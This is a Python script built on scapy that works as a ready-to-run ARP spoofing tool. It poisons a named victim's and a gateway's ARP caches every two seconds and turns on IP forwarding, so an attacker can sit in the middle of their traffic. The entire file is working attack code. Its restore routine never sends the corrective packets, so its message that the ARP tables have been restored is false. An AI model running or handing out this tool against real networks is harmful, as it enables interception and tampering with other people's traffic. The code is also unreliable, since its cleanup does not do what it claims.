
import time, signal, sys, subprocess, argparse
from scapy.all import *

class ARPSpoofer:
	def __init__(self, victim_ip, gateway_ip, interface, verbose=False):
		self.victim_ip = victim_ip
		self.gateway_ip = gateway_ip
		self.interface = interface
		self.verbose = verbose
		self.restore_packets = []

	def enable_ip_forwarding(self):
		try:
			with open('/proc/sys/net/ipv4/ip_forward','w') as f:
				f.write('1')
			if self.verbose:
				print("IP forwarding enabled")
		except Exception as e:
			print(f"Error enabling IP forwarding: {e}")

	def disable_ip_forwarding(self):
                try:
                        with open('/proc/sys/net/ipv4/ip_forward','w') as f:
                                f.write('0')
                        if self.verbose:
                                print("IP forwarding disabled")
                except Exception as e:
                        print(f"Error disabling IP forwarding: {e}")

	def get_mac(self, ip):
		try:
			arp_request = ARP(pdst=ip)
			broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
			arp_request_broadcast = broadcast / arp_request
			answered_list = srp(arp_request_broadcast, timeout=1, iface=self.interface, verbose=False)[0]

			if answered_list:
				return answered_list[0][1].hwsrc
			else:
				print(f"Could not resolve MAC for {ip}")
				return None
		except Exception as e:
			print(f"Error getting MAC for {ip}: {e}")
			return None

	def spoof(self, target_ip, spoof_ip):
		try:
			target_mac = self.get_mac(target_ip)
			if target_mac:
				packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
				send(packet, verbose=False, iface=self.interface)

				if self.verbose:
					print(f"Sent spoofed ARP to {target_ip}: {spoof_ip} is at {packet.hwsrc}")
		except Exception as e:
			print(f"Error spoofint: {e}")

	def restore(self, target_ip, source_ip):
		try:
			target_mac = self.get_mac(target_ip)
			source_mac = self.get_mac(source_ip)

			if target_mac and source_mac:
				packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
		except Exception as e:
			print("Error restoring {target_ip}: {e}")

	def start_spoofing(self):
		print(f"Starting ARP Spoofing attack, press Ctrl+C to stop and restore ARP tables")
		print(f"Victim: {self.victim_ip} ")
		print(f"Gateway: {self.gateway_ip}")
		print(f"Interface: {self.interface}")

		self.enable_ip_forwarding()
		try:
			sent_packets = 0
			while True:
				#poison victim's ARP cache -> tells victim we are gateway
				self.spoof(self.victim_ip, self.gateway_ip)
				#poison gateway's ARP cache -> tells gateway we are victim
				self.spoof(self.gateway_ip, self.victim_ip)

				sent_packets += 2
				if self.verbose:
					print(f"Packets sent: {sent_packets}", end="")

				time.sleep(2)	#sends spoofed packets every 2 secs

		except KeyboardInterrupt:
			print(f"Restoring ARP Tables")
			self.stop_spoofing()

	def stop_spoofing(self):
		self.restore(self.victim_ip, self.gateway_ip)
		self.restore(self.gateway_ip, self.victim_ip)

		self.disable_ip_forwarding()
		print("ARP spoofing stopped + ARP tables restored")
		sys.exit(0)

def signal_handler(sig, frame):
	print('Exiting...')
	sys.exit(0)

def main():
	parser = argparse.ArgumentParser(description='ARP Spoofing tool')
	parser.add_argument('victim_ip', help='IP address of the victim machine')
	parser.add_argument('gateway_ip', help='IP ddrss of gateway')
	parser.add_argument('interface', help='Network interface to use')
	parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')

	args = parser.parse_args()
	signal.signal(signal.SIGINT, signal_handler) #registers signal handler for exit

	#create and start ARP spoofer
	spoofer = ARPSpoofer(args.victim_ip, args.gateway_ip, args.interface, args.verbose)
	spoofer.start_spoofing()

if __name__ == "__main__":
	main()
